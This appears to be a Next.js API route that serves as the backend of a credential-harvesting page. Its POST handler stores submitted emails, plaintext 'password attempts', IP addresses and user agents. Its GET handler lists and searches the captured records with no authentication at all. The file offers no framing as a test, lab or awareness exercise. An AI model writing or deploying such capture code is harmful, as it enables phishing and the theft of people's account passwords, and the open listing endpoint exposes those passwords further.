import { NextRequest, NextResponse } from 'next/server';
import { db } from '@/db';
import { emailCaptures } from '@/db/schema';
import { like, desc } from 'drizzle-orm';

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const limit = Math.min(parseInt(searchParams.get('limit') || '10'), 100);
    const offset = parseInt(searchParams.get('offset') || '0');
    const search = searchParams.get('search');

    let query = db.select().from(emailCaptures).$dynamic();

    if (search) {
      query = query.where(like(emailCaptures.email, `%${search}%`));
    }

    const results = await query
      .orderBy(desc(emailCaptures.createdAt))
      .limit(limit)
      .offset(offset);

    return NextResponse.json(results, { status: 200 });
  } catch (error) {
    console.error('GET error:', error);
    return NextResponse.json({ 
      error: 'Internal server error: ' + error,
      code: 'INTERNAL_ERROR'
    }, { status: 500 });
  }
}

export async function POST(request: NextRequest) {
  try {
    const requestBody = await request.json();
    const { email, passwordAttempt, ipAddress, userAgent } = requestBody;

    // Validate required fields
    if (!email || typeof email !== 'string' || email.trim() === '') {
      return NextResponse.json({ 
        error: "Email is required and cannot be empty",
        code: "MISSING_EMAIL" 
      }, { status: 400 });
    }

    if (!passwordAttempt || typeof passwordAttempt !== 'string' || passwordAttempt.trim() === '') {
      return NextResponse.json({ 
        error: "Password attempt is required and cannot be empty",
        code: "MISSING_PASSWORD_ATTEMPT" 
      }, { status: 400 });
    }

    // Sanitize inputs
    const sanitizedEmail = email.trim().toLowerCase();
    const sanitizedPasswordAttempt = passwordAttempt.trim();

    // Prepare insert data
    const insertData = {
      email: sanitizedEmail,
      passwordAttempt: sanitizedPasswordAttempt,
      ipAddress: ipAddress?.trim() || null,
      userAgent: userAgent?.trim() || null,
      createdAt: new Date().toISOString()
    };

    const newCapture = await db.insert(emailCaptures)
      .values(insertData)
      .returning();

    return NextResponse.json(newCapture[0], { status: 201 });
  } catch (error) {
    console.error('POST error:', error);
    return NextResponse.json({ 
      error: 'Internal server error: ' + error,
      code: 'INTERNAL_ERROR'
    }, { status: 500 });
  }
}